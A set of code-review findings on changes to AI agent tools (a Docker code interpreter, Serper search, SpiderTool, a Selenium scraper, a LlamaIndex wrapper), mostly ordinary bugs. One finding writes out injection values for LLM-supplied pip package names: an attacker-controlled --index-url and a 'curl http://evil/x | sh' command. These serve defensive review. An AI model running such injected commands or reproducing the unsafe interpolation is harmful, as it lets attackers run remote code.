findings.failure_scenario: run_code_in_docker('print("Hello, World!")', []) builds `python3 -c "print("Hello, World!")"`; docker-py shlex-splits the string (or the daemon/shell re-parses it), producing a parse error such as `ValueError: No closing quotation` instead of output. Code containing shell metacharacters is likewise no longer passed verbatim. The deleted test `test_run_code_in_docker_with_script` used exactly `print("This is line 1")` and would have caught this.
findings.summary: The code string is interpolated into a single command string (`python3 -c "{code}"`) instead of being passed as an argv list, so any double quote in the code breaks command parsing.

findings.failure_scenario: libraries_used=["numpy --index-url https://attacker.example/simple"] (an agent/tool-argument-controlled string) is split by docker into `pip install numpy --index-url https://attacker.example/simple`, making pip use an attacker-controlled index; if the command string is shell-interpreted, `numpy; curl http://evil/x | sh` executes a shell command in the container.
findings.summary: `exec_run(f"pip install {library}")` interpolates LLM-supplied library names into a command string, so extra words become pip options/arguments rather than part of one package name (previously passed as the argv list ["pip", "install", library]).

findings.failure_scenario: SpiderTool()._run(url="https://example.com", mode="crawl") now sends only {"return_format": "markdown"}; per the README changed in this same diff, an unset/0 limit means crawl all pages, so the tool crawls the entire site (runaway latency and Spider API credit consumption) where it previously capped at 5 pages.
findings.summary: Crawl mode no longer applies the removed `DEFAULT_CRAWL_LIMIT = 5`, so an unbounded crawl is requested when the caller passes no params.

findings.failure_scenario: If the Serper endpoint accepts the connection but never responds (or a network middlebox blackholes it), `requests.request(...)` with no timeout hangs indefinitely, blocking the agent's tool call with no failure surfaced.
findings.summary: The rewritten request drops the timeout that the baseline passed (`timeout=10`), so the HTTP call can block forever.

findings.failure_scenario: With an invalid or expired SERPER_API_KEY, Serper answers HTTP 401 with `{"message": "Unauthorized"}`; `"organic" not in results` is true, so the tool silently returns that raw dict as the search result (also breaking the string return type), hiding the auth failure. A 502 HTML page instead raises `requests.exceptions.JSONDecodeError` at `response.json()`.
findings.summary: Removed `raise_for_status()`/JSON error handling from the baseline: HTTP error bodies are parsed and returned as if they were search results, and non-JSON responses raise unhandled.

findings.failure_scenario: Unmocked, `run_code_in_docker(code, "numpy,pandas")` loops over the string and runs `pip install n`, `pip install u`, ... (13 separate pip execs for a 13-character string); because the docker client is a MagicMock the test still passes, so it hides install-path breakage and enshrines an argument shape `CodeInterpreterSchema.libraries_used: List[str]` rejects.
findings.summary: The test now passes a comma-joined string where the schema and `run_code_in_docker`/`_install_libraries` require `List[str]`, and `_install_libraries` iterates that string character by character.

findings.failure_scenario: LlamaIndexTool.from_tool(t, result_as_answer=True) (the flag exists on crewai's BaseTool and was what the deleted branch read) now returns the raw LlamaIndex ToolOutput/ToolCall object; since crewai promotes result_as_answer tool output directly to the final answer, the agent's final answer becomes the tool-call repr instead of the text content.
findings.summary: Removed the `if self.result_as_answer: return tool(*args, **kwargs).content` branch, so the LlamaIndex tool no longer unwraps its ToolOutput when crewai's result_as_answer flag is enabled.

findings.failure_scenario: tool._run(search_query="x", n_results=25) asks Serper for 25 results but slices `results["organic"][: self.n_results]` (default 10), returning 10; conversely with constructor n_results=5 and call n_results=10, 10 are fetched and 5 returned. The kwarg is therefore inconsistent between request and response.
findings.summary: The request payload uses the per-call local `n_results` but the result slice still uses `self.n_results`, so a caller-supplied `n_results` cannot control the returned count.

findings.failure_scenario: SpiderTool()._run(url="https://x", params={"return_format": "html2text"}) silently returns markdown even though the README modified in this diff documents `markdown`, `raw`, `text`, and `html2text` as supported; the dict owned by the caller is also mutated after the call, so a reused params dict keeps the injected key.
findings.summary: `params["return_format"] = "markdown"` forcibly overrides a caller-provided return format and mutates the caller's dict.

findings.failure_scenario: SeleniumScrapingTool()._run(website_url="HTTPS://example.com") or the constructor with "HTTP://example.com" raises ValueError("URL must start with http:// or https://") even though the URL is valid and Chrome accepts it; the same case-sensitive regex is duplicated in `_create_driver` (line 135).
findings.summary: The URL scheme check `re.match(r'^https?://', v)` is case-sensitive although URL schemes are case-insensitive.

findings.failure_scenario: The README added in this diff lists `return_html` under Arguments, but when an agent invokes the tool the argument is not part of the schema (and when website_url is set at construction the schema is the empty FixedSeleniumScrapingToolSchema), so the model cannot discover or pass it; the new tests only call `_run` directly, so this interface gap is never exercised.
findings.summary: `return_html` is consumed from `_run` kwargs but is absent from `SeleniumScrapingToolSchema`/`FixedSeleniumScrapingToolSchema`, the args_schema that exposes tool arguments to agents.

findings.failure_scenario: SpiderTool()._run(url="https://x", mode=None), which type-checks against the declared signature, raises ValueError("Unknown mode in `mode` parameter...") instead of treating None as the documented default "scrape".
findings.summary: `mode` is annotated `Optional[Literal["scrape", "crawl"]]` (None permitted by the signature) but the validation rejects None.

findings.failure_scenario: Copying the example verbatim raises `NameError: name 'Agent' is not defined` at `searcher = Agent(...)`; the snippet needs `from crewai import Agent, Task, Crew`.
findings.summary: The new README example uses Agent, Task, and Crew but only imports SpiderTool, so the example cannot run as written.
